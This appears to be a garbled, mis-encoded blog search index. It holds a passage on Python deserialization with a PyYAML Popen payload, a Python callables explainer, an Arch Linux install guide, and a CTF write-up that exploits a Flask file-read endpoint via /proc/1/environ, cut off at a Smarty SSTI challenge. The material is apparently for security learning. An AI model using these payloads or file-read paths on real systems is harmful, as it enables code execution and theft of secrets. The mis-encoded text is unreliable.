é€’å‚æ•°æ¥æ‰§è¡Œçš„, è€Œmarshalå‡½æ•°æœ¬èº«å°±æ˜¯ä¸€ä¸ªcallable, éœ€è¦æ‰§è¡Œå®ƒ, è€Œä¸æ˜¯å°†ä»–ä½œä¸ºæŸä¸ªå‡½æ•°çš„å‚æ•°.\nPyload(PyYaml \u0026gt;= 5.1)\n1 2 3 4 5 from yaml import * data = b\u0026#34;\u0026#34;\u0026#34;!!python/object/apply:subprocess.Popen - calc\u0026#34;\u0026#34;\u0026#34; deserialized_data = load(data, Loader=Loader) print(deserialized_data) 1 2 3 4 5 from yaml import * data = b\u0026#34;\u0026#34;\u0026#34;!!python/object/apply:subprocess.Popen - calc\u0026#34;\u0026#34;\u0026#34; deserialized_data = unsafe_load(data) print(deserialized_data) å‚è€ƒï¼š\nPythonååºåˆ—åŒ–æ¼æ´ä¸æ²™ç®±é€ƒé€¸\nPickleååºåˆ—åŒ–\nPythonå®‰å…¨å­¦ä¹ â€”Pythonååºåˆ—åŒ–æ¼æ´\npythonååºåˆ—åŒ–è¯¦è§£\nå…¶ä»–ï¼š\nå…³äºcallableï¼š åœ¨ Python ä¸­ï¼Œâ€œcallableâ€ï¼ˆå¯è°ƒç”¨å¯¹è±¡ï¼‰ æ˜¯æŒ‡ä»»ä½•å¯ä»¥é€šè¿‡ () è¿ç®—ç¬¦è°ƒç”¨çš„å¯¹è±¡ã€‚ç®€å•æ¥è¯´ï¼Œå¦‚æœä¸€ä¸ªå¯¹è±¡å¯ä»¥åƒå‡½æ•°ä¸€æ ·è¢«è°ƒç”¨ï¼ˆä¾‹å¦‚ obj()ï¼‰ï¼Œå®ƒå°±æ˜¯å¯è°ƒç”¨çš„ã€‚ä»¥ä¸‹æ˜¯å…³äº callable çš„è¯¦ç»†è§£é‡Šï¼š\n1. å¸¸è§çš„å¯è°ƒç”¨å¯¹è±¡ç±»å‹\r(1) å‡½æ•°ï¼ˆFunctionï¼‰\råŒ…æ‹¬å†…ç½®å‡½æ•°ã€è‡ªå®šä¹‰å‡½æ•°ã€Lambda å‡½æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 python def greet(name): print(f\u0026#34;Hello, {name}!\u0026#34;) # è°ƒç”¨å‡½æ•° greet(\u0026#34;Alice\u0026#34;) # è¾“å‡º Hello, Alice! # Lambda ä¹Ÿæ˜¯å¯è°ƒç”¨çš„ add = lambda a, b: a + b print(add(3, 5)) # è¾“å‡º 8 (2) ç±»ï¼ˆClassï¼‰\rç±»æœ¬èº«æ˜¯å¯è°ƒç”¨çš„\nï¼Œè°ƒç”¨ç±»ä¼šåˆ›å»ºå®ƒçš„å®ä¾‹ã€‚\n1 2 3 4 5 6 7 python class Dog: def __init__(self, name): self.name = name # è°ƒç”¨ç±»åˆ›å»ºå®ä¾‹ my_dog = Dog(\u0026#34;Buddy\u0026#34;) # Dog ç±»æ˜¯å¯è°ƒç”¨çš„ (3) æ–¹æ³•ï¼ˆMethodï¼‰\rç±»ä¸­å®šä¹‰çš„æ–¹æ³•ï¼ˆå®ä¾‹æ–¹æ³•ã€ç±»æ–¹æ³•ã€é™æ€æ–¹æ³•ï¼‰ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 python class Calculator: def add(self, a, b): # å®ä¾‹æ–¹æ³• return a + b @classmethod def multiply(cls, a, b): # ç±»æ–¹æ³• return a * b @staticmethod def subtract(a, b): # é™æ€æ–¹æ³• return a - b calc = Calculator() calc.add(2, 3) # å®ä¾‹æ–¹æ³•è°ƒç”¨ Calculator.multiply(2, 3) # ç±»æ–¹æ³•è°ƒç”¨ Calculator.subtract(5, 2) # é™æ€æ–¹æ³•è°ƒç”¨ (4) å®ç°äº† __call__ æ–¹æ³•çš„å¯¹è±¡\rå¦‚æœä¸€ä¸ªç±»å®šä¹‰äº†\n1 __call__ æ–¹æ³•ï¼Œå®ƒçš„å®ä¾‹ä¼šæˆä¸ºå¯è°ƒç”¨å¯¹è±¡ã€‚\n1 2 3 4 5 6 7 8 9 10 python class Adder: def __init__(self, x): self.x = x def __call__(self, y): return self.x + y add_5 = Adder(5) print(add_5(3)) # è¾“å‡º 8ï¼ˆç­‰ä»·äº add_5.__call__(3)ï¼‰ (5) å…¶ä»–å†…ç½®å¯è°ƒç”¨å¯¹è±¡\rç”Ÿæˆå™¨å‡½æ•°ã€éƒ¨åˆ†å‡½æ•°ï¼ˆ\n1 functools.partial ï¼‰ç­‰ã€‚\n1 2 3 4 5 6 7 8 python import functools def power(base, exp): return base ** exp square = functools.partial(power, exp=2) # éƒ¨åˆ†å‡½æ•° print(square(3)) # è¾“å‡º 9 2. å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å¯è°ƒç”¨ï¼Ÿ\rä½¿ç”¨å†…ç½®å‡½æ•° callable() å¯ä»¥æ£€æµ‹å¯¹è±¡æ˜¯å¦å¯è°ƒç”¨ï¼š\n1 2 3 4 python print(callable(len)) # Trueï¼ˆå†…ç½®å‡½æ•°ï¼‰ print(callable(\u0026#34;hello\u0026#34;)) # Falseï¼ˆå­—ç¬¦ä¸²ä¸å¯è°ƒç”¨ï¼‰ print(callable(Adder(5))) # Trueï¼ˆå®ç°äº† __call__ çš„å®ä¾‹ï¼‰ 3. ä¸å¯è°ƒç”¨çš„å¯¹è±¡ç¤ºä¾‹\råŸºç¡€æ•°æ®ç±»å‹ï¼šæ•´æ•°ã€å­—ç¬¦ä¸²ã€åˆ—è¡¨ç­‰ã€‚\n1 2 3 python x = 42 x() # æŠ¥é”™ï¼š\u0026#39;int\u0026#39; object is not callable æœªå®ç° __call__ çš„å®ä¾‹ï¼š\n1 2 3 4 5 6 python class Cat: pass my_cat = Cat() my_cat() # æŠ¥é”™ï¼š\u0026#39;Cat\u0026#39; object is not callable 4. Callable çš„å®é™…åº”ç”¨åœºæ™¯\rè£…é¥°å™¨ï¼ˆDecoratorï¼‰ï¼š\nè£…é¥°å™¨æœ¬èº«å¿…é¡»æ˜¯å¯è°ƒç”¨å¯¹è±¡ï¼ˆå‡½æ•°æˆ–ç±»ï¼‰ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 python def logger(func): def wrapper(*args, **kwargs): print(f\u0026#34;Calling {func.__name__}\u0026#34;) return func(*args, **kwargs) return wrapper @logger def say_hello(): print(\u0026#34;Hello!\u0026#34;) say_hello() # è¾“å‡º \u0026#34;Calling say_hello\u0026#34; å’Œ \u0026#34;Hello!\u0026#34; åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼š\né€šè¿‡å˜é‡ååŠ¨æ€è°ƒç”¨å‡½æ•°ã€‚\n1 2 3 4 5 6 python def do_operation(op, a, b): operations = {\u0026#34;add\u0026#34;: lambda x, y: x + y, \u0026#34;mul\u0026#34;: lambda x, y: x * y} return operations[op](a, b) print(do_operation(\u0026#34;add\u0026#34;, 3, 5)) # è¾“å‡º 8 å›è°ƒæœºåˆ¶ï¼š\nå°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œåœ¨ç‰¹å®šäº‹ä»¶å‘ç”Ÿæ—¶è°ƒç”¨ã€‚\n1 2 3 4 5 6 7 8 9 python def on_button_click(callback): print(\u0026#34;æŒ‰é’®è¢«ç‚¹å‡»äº†ï¼\u0026#34;) callback() def show_message(): print(\u0026#34;æ‰§è¡Œå›è°ƒå‡½æ•°\u0026#34;) on_button_click(show_message) æ€»ç»“\rå¯è°ƒç”¨å¯¹è±¡æ˜¯ Python çš„æ ¸å¿ƒæ¦‚å¿µä¹‹ä¸€ï¼ŒåŒ…æ‹¬å‡½æ•°ã€ç±»ã€æ–¹æ³•å’Œå®ç°äº† __call__ çš„å®ä¾‹ã€‚ ä½¿ç”¨ callable() å¯ä»¥å¿«é€Ÿæ£€æµ‹å¯¹è±¡æ˜¯å¦å¯è°ƒç”¨ã€‚ ç†è§£ callable æ˜¯æŒæ¡è£…é¥°å™¨ã€åŠ¨æ€ç¼–ç¨‹å’Œå›è°ƒæœºåˆ¶çš„å…³é”®ã€‚ ","date":"2025-06-01T10:29:18+08:00","permalink":"https://Oight.github.io/p/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Pythonååºåˆ—åŒ–"},{"content":"å®‰è£…äº†ä¸‹archåŒç³»ç»Ÿï¼ŒçœŸä¸å¥½å®‰å•Šï¼Œç°æŠŠæ‰€æœ‰éœ€è¦ç”¨åˆ°çš„ä»£ç å†™åœ¨è¿™\rå‰æœŸå‡†å¤‡ï¼š\r1 2 1.åˆ¶ä½œå¥½ç³»ç»Ÿç›˜ï¼Œåœ¨åˆ¶ä½œç³»ç»Ÿç›˜æ—¶éœ€æ³¨æ„åˆ†åŒºç±»å‹ä½¿ç”¨GPTï¼Œç„¶ååœ¨ä¸»æ¿å…³é—­å®‰å…¨å¯åŠ¨ 2å¼€æœºæ—¶ä½¿ç”¨Uç›˜å¯åŠ¨ æ— çº¿ç½‘å¡è¿æ¥ç½‘ç»œï¼ˆæœ‰çº¿å¯ä»¥ç•¥è¿‡ï¼‰\r1 2 3 4 5 6 7 8 1.iwctl 2.device list (åˆ—å‡ºæ‰€æœ‰WIFIè®¾å¤‡) 3.station [ç½‘å¡åç§°] scan (æ‰«æç½‘ç»œ) 4.station [ç½‘å¡åç§°] get-networks (æ˜¾ç¤ºæ‰€æœ‰ç½‘ç»œ) 5.station [ç½‘å¡åç§°] connect [WIFIåç§°] è¾“å…¥å¯†ç  Ctrl + d é€€å‡º pingä¸€ä¸‹çœ‹çœ‹æ˜¯å¦è¿æ¥åˆ°ç½‘ç»œ ï¼ˆping www.baidu.comï¼‰ è¿ä¸Šç½‘åï¼Œæ›´æ–°ç³»ç»Ÿæ—¶é—´\r1.timedatectl (æ›´æ–°ç³»ç»Ÿæ—¶é—´)\nåˆ†åŒº\råˆ†åŒº\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 1.fdisk -l (æŸ¥çœ‹è‡ªå·±åˆ†åŒº) æ‰¾åˆ°æˆ‘ä»¬è¦å®‰è£…çš„ç¡¬ç›˜ï¼Œå• nvme ç›˜ä¸º /dev/nvme0n1;å• sata ç›˜ä¸º /dev/sda1 2.cfdisk + [ä½ çš„ç¡¬ç›˜] 3.Type é€‰æ‹©ç¬¬ä¸€ä¸ª efi system 4.Write 5.é€‰ä¸­åˆ†å‡ºæ¥çš„ç©ºé—´ï¼Œé€‰æ‹© newï¼Œåˆ›å»ºæ ¹åˆ†åŒºï¼Œè¾“å…¥åˆ†åŒºå¤§å°ï¼ˆä¸å°äº22Gï¼‰ 5.é€‰ä¸­å‰©ä¸‹çš„ç©ºä½™ç©ºé—´ï¼Œé€‰æ‹©new ï¼Œåˆ›å»º home åˆ†åŒºï¼Œè¾“å…¥åˆ†åŒºå¤§å° 6.é€‰ä¸­å‰©ä¸‹çš„ç©ºä½™ç©ºé—´ï¼Œé€‰æ‹© new ,åˆ›å»º swap äº¤æ¢ç©ºé—´ ï¼ˆç±»ä¼¼äº win çš„è™šæ‹Ÿå†…å­˜ï¼‰ 7.Sort æ’ä¸‹åº 8.é€‰ä¸­ home åˆ†åŒºï¼ŒType é€‰æ‹© linux home 9.é€‰ä¸­ swap åˆ†åŒºï¼ŒType é€‰æ‹© linux swap 10.Write å†™å…¥ 11.Quit é€€å‡º 12.å†æ¬¡æ‰§è¡Œ fdisk -l çœ‹çœ‹æ˜¯å¦åˆ†å¥½ æ ¼å¼åŒ–åˆ†åŒº\r1 2 3 4 5 1.mkfs.[æ–‡ä»¶ç³»ç»Ÿ] ï¼ˆ-fï¼‰/dev/[åˆ†åŒºç¼–å·] ä¾‹ï¼š mkfs.btrfs -f /dev/nvme0n1p4 mkfs.ext4 /dev/nvme0n1p4 2.mkfs.btrfs -f /dev/nvme0n1p5 (æ ¼å¼åŒ– home åˆ†åŒº) 3.mkswap /dev/nvme0n1p6 (åˆå§‹åŒ–swapåˆ†åŒº) æŒ‚è½½åˆ†åŒº\r1 2 3 4 5 6 7 ä¸€å®šè¦å…ˆæŒ‚è½½æ ¹åˆ†åŒº 1.mount /dev/[æ ¹åˆ†åŒºç¼–å·] /mnt ä¾‹ï¼šmount /dev/nvme0n1p4 /mnt 2.mount --mkdir /dev/[homeåˆ†åŒºç¼–å·] /mnt/home ï¼ˆæŒ‚è½½æ ¹åˆ†åŒºï¼‰ 3.mount --mkdir /dev/[efiåˆ†åŒºç¼–å·] /mnt/efi ï¼ˆæŒ‚è½½efiåˆ†åŒºï¼‰ ä¾‹ï¼šmount --mkdir /dev/nvme0n1p1 /mnt/efi 4.swapon /dev/[äº¤æ¢ç©ºé—´åˆ†åŒºç¼–å·] ï¼ˆæŒ‚è½½äº¤æ¢åˆ†åŒºï¼‰ é…ç½®å›½å†…é•œåƒæº\r1 2 3 4 5 6 7 1.nano /etc/pacman.d/mirrorlist 2.åœ¨ç¬¬ä¸€è¡Œæ·»åŠ  Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch 3.Ctrl + o ä¿å­˜ 4.Ctrl + x é€€å‡º 5.pacman -Syy (åˆ·æ–°) 6.pacman -S archlinux-keyring (é‡æ–°å®‰è£…å¯†é’¥) å®‰è£…åŸºæœ¬ç³»ç»Ÿ\r1 2 1.pacstrap /mnt [è½¯ä»¶åŒ…] base ï¼ˆåŸºç¡€ç³»ç»Ÿï¼‰ï¼Œbase-devel (å·¥å…·åŒ…) ä¾‹ï¼š\n1 pacstrap /mnt base base-devel linux-zen linux-zen-headers linux-firmware networkmanager grub os-prober efibootmgr ntfs-3g amd-ucode bluez bluez-utils nano ä¸€è·¯å›è½¦å°±å¯ä»¥\nåˆ›å»º fstab (è‡ªåŠ¨æŒ‚è½½é…ç½®æ–‡ä»¶)\r1.genfstab -U /mnt \u0026raquo; /mnt/etc/fstab\nchrootè¿›å…¥ç³»ç»Ÿ\r1.arch-chroot /mnt\nè®¾ç½®æ—¶åŒº\rè®¾ç½®æ—¶åŒº\r1.ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\nè®¾ç½®ç¡¬ä»¶æ—¶é—´\r1.hwclock â€“systohc\næœ¬åœ°åŒ–\rç¼–è¾‘locale.gen\r1 2 1.nano /etc/locale.gen {åˆ é™¤ en_US.UTF-8 UTF-8 å’Œ zh_CN.UTF-8 UTF-8 å‰çš„\u0026#34;#\u0026#34;} 2.locale-gen (ç”Ÿæˆlocale) ç¼–è¾‘locale.conf:\r1.nano /etc/locale.conf {æ·»åŠ  LANG=en_US.UTF-8}\nè®¾ç½®ä¸»æœºå\rè®¾ç½®ä¸»æœºå\r1.nano /etc/hostname\nè®¾ç½® root å¯†ç \r1.passwd\nè®¾ç½®æ™®é€šç”¨æˆ·\r1.useradd -m -G wheel [ç”¨æˆ·å]\nä¸ºç”¨æˆ·åˆ›å»ºå¯†ç \r1.passwd [ç”¨æˆ·å]\nç¼–è¾‘ sudoers èµ‹äºˆç”¨æˆ· root æƒé™\r1.nano /etc/sudoers {åˆ é™¤ %wheel ALL=(ALL:ALL) ALLå‰çš„â€œ#â€}\nå¯ç”¨æœåŠ¡\rç½‘ç»œ\r1.systemctl enable NetworkManager\nè“ç‰™\r1.systemctl enable bluetooth\nç¼–è¾‘ grub\rç¼–è¾‘ grub\r1.nano /etc/default/grub {å»æ‰ GRUB_DISABLE_OS_PROBER=false å‰çš„â€œ#â€}\nå®‰è£… grub æœåŠ¡\r1 2 1.grub-install --target=x86_64-efi --efi-directory=/efi --bootloader-id=grub 2.grub-mkconfig -o /boot/grub/grub.cfg (æ›´æ–° grub å‘å¯¼) å®‰è£…KDE\rsudo pacman -S plasma\nå¼€æœºè‡ªå¯æ˜¾ç¤ºç®¡ç†\rsystemctl enable sddm\nå…¶ä»–å®‰è£…\rpacman -S konsole ark dolphin kate\nå®Œæˆå®‰è£…\ré€€å‡º\rexit\né‡å¯\rreboot\nè¿›å…¥ç³»ç»Ÿ\r1 alt + Ctrl + T æ‰“å¼€ç»ˆç«¯ æ›´æ–° grub\rsudo grub-mkconfig -o /boot/grub/grub.cfg\nå®‰è£…ä¸­æ–‡å­—ä½“\rsudo pacman -S adobe-source-han-sans-cn-fonts\nè®¾ç½®è¯­è¨€åé‡å¯\né…ç½®å›½å†…æº\ré…ç½®å›½å†…æº\r1 2 3 4 5 6 sudo nano /etc/pacman.conf å¼€å¯32ä½åº“ï¼Œ{å»æ‰ [multilib]åŠä¸‹ä¸€è¡Œå‰çš„ \u0026#34;#\u0026#34;} ç„¶ååœ¨ä¸‹é¢æ·»åŠ ï¼š Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch (æ¸…åæº)æˆ– Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch (ç§‘å¤§æº)æˆ– Server = https://repo.huaweicloud.com/archlinux/$repo/os/$srch (åä¸ºæº) åˆ·æ–°è½¯ä»¶åŒ…\rsudo pacman -Syy\nå¯¼å…¥å¯†é’¥\rsudo pacman -S archlinuxcn-keyring\nè½¯ä»¶å•†åº—è½¯ä»¶æºå®‰è£…ï¼ˆå¯é€‰ï¼‰\rsudo pacman -S archlinux-appstream-data packagekit-qt6 fwupd\nå®‰è£… aur åŠ©æ‰‹ yay\r1 2 sudo pacman -S yay yay -Syy å®‰è£…ä¸­æ–‡è¾“å…¥æ³•å‚ç…§ ArchWiKi\ræ¨èFcitx5\nyay\rä½¿ç”¨ Yay è¿›è¡ŒåŒ…ç®¡ç†\rYay éµå¾ªä¸ pacman ç±»ä¼¼ï¼ˆä½†ä¸ç›¸åŒï¼‰çš„å‘½ä»¤ç»“æ„ã€‚æ‰€ä»¥ä½ ç”¨ Yay ç®¡ç† AUR åŒ…åº”è¯¥ä¸éš¾ã€‚\næœç´¢è½¯ä»¶åŒ…ï¼š\n1 yay search_term å®‰è£…è½¯ä»¶åŒ…ï¼š\n1 yay -S package_name åˆ é™¤è½¯ä»¶åŒ…ï¼š\n1 yay -R package_name è¦åˆ é™¤åŒ…åŠå…¶ä¾èµ–é¡¹ï¼š\n1 yay -Rns package_name ä»…å‡çº§ AUR åŒ…ï¼š\n1 yay -Sua Yay è¿˜èƒ½å¤Ÿå‡çº§é AUR è½¯ä»¶åŒ…ã€‚ä¸Šé¢çš„ a æ ‡å¿—å°†å…¶é™åˆ¶ä¸º AURã€‚\nå°† Yay å‡çº§åˆ°æ–°ç‰ˆæœ¬\rç°åœ¨ï¼Œä½ å¯èƒ½æƒ³çŸ¥é“å¦‚ä½•å°† Yay å‡çº§åˆ°å¯ç”¨çš„æ–°ç‰ˆæœ¬ã€‚\nç­”æ¡ˆæ˜¯ä½ ä¸éœ€è¦åšä»»ä½•ç‰¹åˆ«çš„äº‹æƒ…ã€‚å½“ä½ è¿è¡Œä»¥ä¸‹å‘½ä»¤æ—¶ï¼ŒYay å¯ä»¥è‡ªè¡Œæ›´æ–°ï¼š\n1 yay -Sua ","date":"2025-06-01T10:29:03+08:00","image":"https://moegirl.uk/images/c/c9/Archlinux_chan.png?20221105073224","permalink":"https://Oight.github.io/p/archlinux/","title":"Archlinux"},{"content":"WEB\rflow\råˆ›å»ºå®ä¾‹ï¼Œæç¤ºï¼š\n1 2 3 Welcome to My Flask App This is a simple web app using Flask. ç»™å‡ºäº†ä»»æ„æ–‡ä»¶è¯»åŠŸèƒ½\nçœ‹çœ‹ flask åº”ç”¨çš„ç›®å½•ç»“æ„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 my_flask_app/ â”‚ â”œâ”€â”€ app/ â”‚ â”œâ”€â”€ __init__.py â”‚ â”œâ”€â”€ routes/ â”‚ â”‚ â”œâ”€â”€ __init__.py â”‚ â”‚ â”œâ”€â”€ main.py â”‚ â”‚ â””â”€â”€ auth.py â”‚ â”œâ”€â”€ models/ â”‚ â”‚ â”œâ”€â”€ __init__.py â”‚ â”‚ â””â”€â”€ user.py â”‚ â”œâ”€â”€ templates/ â”‚ â”‚ â”œâ”€â”€ layout.html â”‚ â”‚ â””â”€â”€ home.html â”‚ â””â”€â”€ static/ â”‚ â”œâ”€â”€ css/ â”‚ â””â”€â”€ js/ â”‚ â”œâ”€â”€ config.py â”œâ”€â”€ requirements.txt â”œâ”€â”€ migrations/ â”‚ â””â”€â”€ ... â””â”€â”€ run.py æ‰€ä»¥æºç åº”è¯¥åœ¨ /app/main.py ä¸­\nè¯»æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from flask import Flask, request, render_template_string, abort app = Flask(__name__) HOME_PAGE_HTML = \u0026#39;\u0026#39;\u0026#39; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Flask Web Application\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container mt-5\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;display-4 text-center\u0026#34;\u0026gt;Welcome to My Flask App\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;lead text-center\u0026#34;\u0026gt;This is a simple web app using Flask.\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;/file?f=example.txt\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Read example.txt\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39; @app.route(\u0026#39;/\u0026#39;) def index(): return render_template_string(HOME_PAGE_HTML) @app.route(\u0026#39;/file\u0026#39;) def file(): file_name = request.args.get(\u0026#39;f\u0026#39;) if not file_name: return \u0026#34;Error: No file parameter provided.\u0026#34;, 400 try: with open(file_name, \u0026#39;r\u0026#39;) as file: content = file.read() return content except FileNotFoundError: return abort(404, description=\u0026#34;File not found.\u0026#34;) except Exception as e: return f\u0026#34;Error reading file.\u0026#34;, 500 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#34;127.0.0.1\u0026#34;, port=8080) å°è¯•è¯»ç¯å¢ƒå˜é‡ï¼ŒæŸ¥èµ„æ–™å¾—çŸ¥ï¼ŒLinux ç³»ç»Ÿå­˜åœ¨å¦‚ä¸‹æ•æ„Ÿè·¯å¾„ï¼ˆåœ¨å­˜åœ¨è·å–ä»»æ„æ–‡ä»¶è¯»æ—¶ï¼‰\n1 /etc/passwd è¯¥æ–‡ä»¶å‚¨å­˜äº†è¯¥ Linux ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œåªæœ‰rootæƒé™æ‰å¯ä»¥ä¿®æ”¹ã€‚å…¶å…·ä½“æ ¼å¼ä¸º ç”¨æˆ·å:å£ä»¤:ç”¨æˆ·æ ‡è¯†å·:ç»„æ ‡è¯†å·:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:ç™»å½• Shell ï¼ˆä»¥å†’å·ä½œä¸ºåˆ†éš”ç¬¦ï¼‰\n1 /proc/self proc æ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒæä¾›äº†å†…æ ¸æ•°æ®ç»“æ„çš„æ¥å£ã€‚å†…æ ¸æ•°æ®æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶å­˜å‚¨åœ¨å†…éƒ¨åŠå¯¼ä½“å­˜å‚¨å™¨ä¸­æ•°æ®ã€‚é€šè¿‡ /proc/PID å¯ä»¥è®¿é—®å¯¹åº” PID çš„è¿›ç¨‹å†…æ ¸æ•°æ®ï¼Œè€Œ /proc/self è®¿é—®çš„æ˜¯å½“å‰è¿›ç¨‹çš„å†…æ ¸æ•°æ®ã€‚\n1 /proc/self/cmdline è¯¥æ–‡ä»¶åŒ…å«çš„å†…å®¹ä¸ºå½“å‰è¿›ç¨‹æ‰§è¡Œçš„å‘½ä»¤è¡Œå‚æ•°ã€‚\n1 /proc/self/mem /proc/self/mem æ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜å†…å®¹ï¼Œé€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜æ•°æ®ã€‚ä½†æ˜¯æ³¨æ„è¯¥æ–‡ä»¶ä¸èƒ½ç›´æ¥è¯»å–ï¼Œå› ä¸ºæ–‡ä»¶ä¸­å­˜åœ¨ç€ä¸€äº›æ— æ³•è¯»å–çš„æœªè¢«æ˜ å°„åŒºåŸŸã€‚æ‰€ä»¥è¦ç»“åˆ /proc/self/maps ä¸­çš„åç§»åœ°å€è¿›è¡Œè¯»å–ã€‚é€šè¿‡å‚æ•° start å’Œ end åŠåç§»åœ°å€å€¼è¯»å–å†…å®¹ã€‚\n1 /proc/self/maps /proc/self/maps åŒ…å«çš„å†…å®¹æ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»ï¼Œå¯é€šè¿‡è¯»å–è¯¥æ–‡ä»¶æ¥å¾—åˆ°å†…å­˜æ•°æ®æ˜ å°„çš„åœ°å€ã€‚\n1 flask-sessionç»“æ„ flask_session æ˜¯ flask æ¡†æ¶å®ç° session åŠŸèƒ½çš„ä¸€ä¸ªæ’ä»¶ã€‚å…¶ session ç»“æ„åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼šåºåˆ—åŒ–å†…å®¹+æ—¶é—´+é˜²ç¯¡æ”¹å€¼ï¼Œè¿™ä¸‰éƒ¨åˆ†å†…å®¹åŠ å¯†åä»¥ç¬¦å· â€œ.â€æ¥è¿›è¡Œåˆ†éš”ã€‚flask_session é»˜è®¤ session çš„å‚¨å­˜æ˜¯åœ¨ç”¨æˆ· Cookie ä¸­ã€‚ä½†ä¹Ÿå¯ä»¥æŒ‡å®šå­˜å‚¨åœ¨æ•°æ®åº“ï¼Œç¼“å­˜ä¸­é—´ä»¶ï¼ŒæœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ç­‰ç­‰ä¹‹ä¸­ã€‚\næŸ¥é˜…èµ„æ–™ï¼Œå¾—çŸ¥ environ æ–‡ä»¶å­˜å‚¨ç€å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå½¼æ­¤é—´ç”¨ç©ºå­—ç¬¦ï¼ˆNULLï¼‰éš”å¼€ã€‚å˜é‡ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œå…¶å€¼ç”¨å°å†™å­—æ¯è¡¨ç¤ºã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹ environ ç›®å½•æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¿¡æ¯\nå› æ­¤/file?f=/proc/1/environè¯»åˆ°flag\nå‚è€ƒï¼š\nProc ç›®å½•åœ¨ CTF ä¸­çš„åˆ©ç”¨\næ”»é˜²ä¸–ç•Œ-cat_cat_newï¼ˆflask_sessionä¼ªé€ ã€/proc/self/æ–‡ä»¶å¤¹ï¼‰\nFlask é¡¹ç›®ç»“æ„\nDASCTF 2024 åæœˆæŒ‘æˆ˜èµ›\nDASCTFåæœˆèµ›å…¶ä»–é¢˜å¤ªè¿‡äºæŠ½è±¡äº† ~ \u0026gt;_\u0026lt; ~\n[CISCN2019 åä¸œå—èµ›åŒº] Web11 1\råˆšåˆšè¿›å…¥å®ä¾‹,ä¸€æ—¶ä¸çŸ¥æ‰€æª\nåé¢çœ‹åˆ°XFF\nä½¿ç”¨BPæŠ“åŒ…,æ²¡å‘ç°ä»€ä¹ˆç‰¹åˆ«çš„\nåœ¨é¡µé¢åº•éƒ¨å‘ç°ä¸€è¡Œå­—ï¼šBuild With Smarty !\næŸ¥é˜…èµ„æ–™å¾—çŸ¥, Smarty æ˜¯ PHP çš„æ¨¡æ¿å¼•æ“ï¼Œæœ‰åŠ©äºå°†è¡¨ç¤º (HTML/CSS) ä¸åº”ç”¨ç¨‹åºé€»è¾‘åˆ†ç¦»ã€‚åœ¨ 3.1.42 å’Œ 4.0.2 ç‰ˆæœ¬ä¹‹å‰ï¼Œæ¨¡æ¿ä½œè€…å¯ä»¥é€šè¿‡åˆ¶ä½œæ¶æ„æ•°å­¦å­—ç¬¦ä¸²æ¥è¿è¡Œä»»æ„ PHP ä»£ç ã€‚å¦‚æœæ•°å­¦å­—ç¬¦ä¸²ä½œä¸ºç”¨æˆ·æä¾›çš„æ•°æ®ä¼ é€’ç»™æ•°å­¦å‡½æ•°ï¼Œåˆ™å¤–éƒ¨ç”¨æˆ·å¯ä»¥é€šè¿‡åˆ¶ä½œæ¶æ„æ•°å­¦å­—ç¬¦ä¸²æ¥è¿è¡Œä»»æ„ PHP ä»£ç ã€‚ç”¨æˆ·åº”å‡çº§åˆ°ç‰ˆæœ¬ 3.1.42 æˆ– 4.0.2 